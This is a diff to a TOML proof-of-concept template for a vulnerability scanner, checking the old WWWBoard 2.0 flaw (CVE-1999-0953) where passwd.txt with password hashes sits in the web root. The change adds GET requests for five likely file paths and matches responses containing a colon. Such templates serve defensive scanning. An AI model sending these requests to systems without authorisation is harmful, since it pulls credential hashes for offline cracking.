@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "WWWBoard 2.0 将用户加密密码存储于 Web 根目录下的 passwd.txt 文件中，远程攻击者无需认证即可直接访问该文件获取所有用户的加密密码哈希。本 PoC 通过请求 passwd.txt 路径验证文件是否可公开读取。"
+description = "检测 WWWBoard 2.0 是否将加密密码文件 passwd.txt 暴露在 Web 根目录下。远程攻击者无需认证即可通过 HTTP GET 请求直接访问该文件，获取所有用户的加密密码哈希，进而可离线破解获取明文密码。"
 id = "POC-AVE-1999-1500"
-name = "CVE-1999-0953 WWWBoard 2.0 passwd.txt 密码文件泄露 PoC"
+name = "WWWBoard 2.0 passwd.txt Remote Password Disclosure PoC"
 severity = "critical"
 tags = ["ave-1999-1500"]
 vuln_id = [
@@ -11,15 +11,12 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/passwd.txt"
+path = "/{{BaseURL}}/wwwboard/passwd.txt"
 protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
@@ -27,7 +24,46 @@ part = "body"
 type = "word"
 words = [":"]
 
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/wwwboard/passwd.txt"
+protocol = "http"
+
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [":"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wwwboard/password.txt"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [":"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/passwd.txt"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [":"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/board/passwd.txt"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [":"]
